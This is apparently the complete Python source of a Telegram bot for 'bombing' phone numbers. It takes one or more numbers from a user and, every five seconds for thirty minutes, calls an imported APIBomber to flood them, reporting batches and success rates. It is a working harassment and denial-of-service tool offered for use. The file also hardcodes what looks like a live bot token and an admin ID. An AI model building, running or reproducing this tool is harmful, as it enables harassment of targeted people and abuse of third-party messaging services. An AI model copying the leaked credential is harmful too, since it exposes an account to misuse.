import asyncio
import os
import threading
import logging
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from api_bomber import APIBomber

# CONFIG
BOT_TOKEN = os.environ.get("8725864429:AAEGxnXUzWoBbNwvk7Ypodno70jxJ5wTipc")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8794642689"))
PORT = int(os.environ.get("PORT", 5000))

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app
app = Flask(__name__)

@app.route('/')
@app.route('/health')
def health():
    return jsonify({
        "status": "running",
        "timestamp": datetime.now().isoformat()
    })

# Bot data
bomber = APIBomber(max_concurrent=10)
user_data = {}
active_attacks = {}

# -------- HELPERS --------
def clean_number(number):
    number = number.strip()
    if not number.startswith('+'):
        if len(number) == 10 and number.isdigit():
            number = '+91' + number
        else:
            number = '+' + number
    return number

def is_valid_number(number):
    if not number.startswith('+'):
        return False
    digits = number[1:]
    return digits.isdigit() and 10 <= len(digits) <= 15

# -------- COMMANDS --------
def start(update, context):
    keyboard = [
        [InlineKeyboardButton("🔥 Start Attack", callback_data="attack")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    update.message.reply_text(
        "Bot Ready\n\nChoose option:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def button_handler(update, context):
    query = update.callback_query
    query.answer()

    if query.data == "attack":
        query.edit_message_text(
            "Send number(s):\nExample: 9876543210 or multiple separated by comma"
        )
        user_data[query.from_user.id] = {"state": "number"}

    elif query.data == "status":
        user_id = query.from_user.id
        if user_id in active_attacks:
            attack = active_attacks[user_id]
            remaining = attack["end_time"] - datetime.now()
            minutes = int(remaining.total_seconds() // 60)
            query.edit_message_text(
                f"Batches: {attack['count']}\nTime Left: {minutes} min\nSuccess: {attack['success_rate']}%"
            )
        else:
            query.edit_message_text("No active attack")

    elif query.data == "help":
        query.edit_message_text(
            "/start - menu\n/stop - stop\n/status - check status"
        )

def handle_message(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in user_data:
        update.message.reply_text("Use /start first")
        return

    numbers_raw = [n.strip() for n in text.split(',')]
    numbers = []

    for num in numbers_raw:
        cleaned = clean_number(num)
        if is_valid_number(cleaned):
            numbers.append(cleaned)

    if not numbers:
        update.message.reply_text("Invalid number")
        return

    end_time = datetime.now() + timedelta(minutes=30)

    active_attacks[user_id] = {
        "numbers": numbers,
        "end_time": end_time,
        "count": 0,
        "stop": False,
        "success_rate": 0
    }

    context.job_queue.run_repeating(
        lambda ctx: send_attack(ctx, user_id),
        interval=5,
        first=1
    )

    update.message.reply_text("Attack started")

def send_attack(context, user_id):
    if user_id not in active_attacks:
        return

    attack = active_attacks[user_id]

    if attack["stop"] or datetime.now() >= attack["end_time"]:
        context.bot.send_message(chat_id=user_id, text="Attack completed")
        del active_attacks[user_id]
        return

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        results = loop.run_until_complete(
            bomber.bomb_multiple_numbers(attack["numbers"])
        )
        loop.close()

        total_success = 0
        total_apis = 0

        for res in results.values():
            total_success += sum(1 for r in res if r["success"])
            total_apis += len(res)

        rate = (total_success / total_apis * 100) if total_apis else 0

        attack["count"] += 1
        attack["success_rate"] = int(rate)

    except Exception as e:
        logger.error(e)

def stop_command(update, context):
    user_id = update.effective_user.id
    if user_id in active_attacks:
        active_attacks[user_id]["stop"] = True
        update.message.reply_text("Stopped")
    else:
        update.message.reply_text("No active attack")

def status_command(update, context):
    user_id = update.effective_user.id
    if user_id in active_attacks:
        attack = active_attacks[user_id]
        remaining = attack["end_time"] - datetime.now()
        minutes = int(remaining.total_seconds() // 60)

        update.message.reply_text(
            f"Batches: {attack['count']}\nSuccess: {attack['success_rate']}%\nTime: {minutes} min"
        )
    else:
        update.message.reply_text("No active attack")

# -------- RUN --------
def run_bot():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("status", status_command))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    t = threading.Thread(target=run_bot)
    t.start()

    app.run(host="0.0.0.0", port=PORT)
